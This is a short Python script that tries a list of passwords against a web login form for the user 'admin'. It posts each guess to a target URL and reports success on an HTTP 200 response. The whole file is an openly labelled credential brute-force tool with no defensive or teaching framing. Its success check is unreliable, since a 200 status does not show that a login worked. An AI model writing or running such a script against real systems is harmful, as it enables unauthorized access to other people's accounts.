import requests

def brute_force_login(target_url, username, password):
    # Function to brute-force login credentials
    payload = {
        "username": username,
        "password": password,
        "action": "login"
    }
    response = requests.post(target_url, data=payload)
    return response.status_code

# Example usage:
if __name__ == "__main__":
    target_url = "https://www.example.com/login"
    username = "admin"
    password_list = ["password1", "password2", "password3"]  # List of passwords to try

    for password in password_list:
        status_code = brute_force_login(target_url, username, password)
        if status_code == 200:
            print("Login successful! Password:", password)
            break
    else:
        print("Login unsuccessful. Password not found.")
